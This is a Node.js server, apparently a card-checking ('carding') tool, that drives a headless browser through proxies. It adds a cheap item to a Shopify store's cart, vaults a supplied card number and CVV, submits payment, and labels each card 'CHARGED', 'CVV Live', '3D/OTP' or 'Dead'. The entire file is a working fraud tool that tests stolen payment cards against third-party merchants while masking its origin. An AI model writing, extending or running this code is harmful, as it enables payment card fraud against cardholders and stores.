const express = require('express');
const puppeteer = require('puppeteer');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send({ status: "Shopify Headless Browser Engine Active" });
});

app.post('/api/charge', async (req, res) => {
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "MISSING_DATA", gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }

    const cleanSite = site.replace(/\/$/, '');
    const [ccNo, expMonth, expYear, cvv] = card.split('|');

    let browser = null;
    try {
        let proxyAuth = null;
        const launchOptions = {
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--single-process',
                '--disable-gpu'
            ]
        };

        if (proxy) {
            let pClean = proxy.trim();
            const parts = pClean.split(':');
            if (parts.length === 4) {
                const host = parts[0];
                const port = parts[1];
                const user = parts[2];
                const pass = parts[3];
                launchOptions.args.push(`--proxy-server=http://${host}:${port}`);
                proxyAuth = { username: user, password: pass };
            } else if (parts.length === 2) {
                launchOptions.args.push(`--proxy-server=http://${pClean}`);
            } else {
                launchOptions.args.push(`--proxy-server=http://${pClean}`);
            }
        }

        browser = await puppeteer.launch(launchOptions);
        const page = await browser.newPage();

        if (proxyAuth) {
            await page.authenticate(proxyAuth);
        }

        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        // 1. Fetch products JSON safely
        const prodRes = await page.goto(`${cleanSite}/products.json?limit=20`, { waitUntil: 'domcontentloaded', timeout: 30000 });
        const responseText = await page.evaluate(() => document.body.innerText);
        
        let prodData = {};
        try {
            prodData = JSON.parse(responseText);
        } catch (e) {
            await browser.close();
            return res.json({ status: "Dead", message: "STORE_RATE_LIMITED_OR_BLOCKED", gateway: "Shopify Payments", price: "-", site: cleanSite });
        }
        
        let selectedVariantId = null;
        let selectedPrice = 5.00;

        if (prodData && prodData.products) {
            for (const prod of prodData.products) {
                for (const v of prod.variants) {
                    const p = parseFloat(v.price);
                    if (p > 0 && p <= 10.00 && v.available) {
                        selectedVariantId = v.id;
                        selectedPrice = p;
                        break;
                    }
                }
                if (selectedVariantId) break;
            }
        }

        if (!selectedVariantId) {
            await browser.close();
            return res.json({ status: "Dead", message: "NO_PRODUCT_UNDER_10", gateway: "Shopify Payments", price: ">$10", site: cleanSite });
        }

        const formattedPrice = `$${selectedPrice.toFixed(2)}`;

        // 2. Add product via background fetch
        const addCartSuccess = await page.evaluate(async (variantId) => {
            try {
                const res = await fetch('/cart/add.js', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: variantId, quantity: 1 })
                });
                return res.ok;
            } catch (err) {
                return false;
            }
        }, selectedVariantId);

        if (!addCartSuccess) {
            await browser.close();
            return res.json({ status: "Dead", message: "CART_ADD_FAILED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        // 3. Go to checkout page
        await page.goto(`${cleanSite}/checkout`, { waitUntil: 'domcontentloaded', timeout: 35000 });

        // 4. Vault card via Shopify Deposit API
        const vaultResult = await page.evaluate(async (ccNo, expMonth, expYear, cvv) => {
            try {
                const response = await fetch('https://elb.deposit.shopifycs.com/sessions', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({
                        credit_card: { number: ccNo, month: expMonth, year: expYear, name: "Valued Customer", verification_value: cvv }
                    })
                });
                return await response.json();
            } catch (e) {
                return { error: e.message };
            }
        }, ccNo, expMonth, expYear, cvv);

        if (!vaultResult || !vaultResult.id) {
            await browser.close();
            return res.json({ status: "Dead", message: "CARD_VAULT_DECLINED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        // 5. Submit payment payload
        const paymentResponse = await page.evaluate(async (vaultId) => {
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
                    body: JSON.stringify({
                        step: 'payment',
                        s: vaultId,
                        checkout: { credit_card: { vault_id: vaultId } }
                    })
                });
                const text = await res.text();
                return { url: res.url, text: text };
            } catch (e) {
                return { error: e.message };
            }
        }, vaultResult.id);

        await browser.close();
        browser = null;

        if (paymentResponse.error) {
            return res.json({ status: "Dead", message: paymentResponse.error, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        const respText = paymentResponse.text.toLowerCase();
        const finalUrl = paymentResponse.url;

        let authenticError = "DECLINED_BY_PROCESSOR";
        if (paymentResponse.text.includes('notice__content') || paymentResponse.text.includes('error-message')) {
            const match = paymentResponse.text.match(/class="notice__content"[^>]*>([\s\S]*?)<\/p>/i);
            if (match && match[1]) {
                authenticError = match[1].replace(/<[^>]*>?/gm, '').trim();
            }
        }

        // Strict Success Validation to prevent false positives on expired/invalid cards
        const isRealSuccess = 
            (finalUrl.includes('thank_you') || paymentResponse.text.includes('thank_you')) && 
            (paymentResponse.text.includes('order_number') || paymentResponse.text.includes('checkout_token')) &&
            !respText.includes('error') &&
            !respText.includes('declined') &&
            (paymentResponse.text.includes('payment_method') || paymentResponse.text.includes('transactions'));

        if (isRealSuccess) {
            return res.json({ status: "CHARGED", message: "ORDER_PLACED_SUCCESSFULLY", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('insufficient_funds') || respText.includes('insufficient funds')) {
            return res.json({ status: "CVV Live/Insufficient", message: "INSUFFICIENT_FUNDS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('three_d_secure') || respText.includes('challenge') || respText.includes('3d secure')) {
            return res.json({ status: "3D/OTP", message: "CHALLENGE_REQUIRED_3DS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('incorrect_cvc') || respText.includes('security code')) {
            return res.json({ status: "CVV Live/Insufficient", message: "CCN_LIVE_INCORRECT_CVC", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else {
            return res.json({ status: "Dead", message: authenticError, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

    } catch (err) {
        if (browser) {
            try { await browser.close(); } catch(e) {}
        }
        return res.json({ status: "Dead", message: `EXECUTION_ERROR_${err.message}`, gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Headless Browser API running on port ${PORT}`));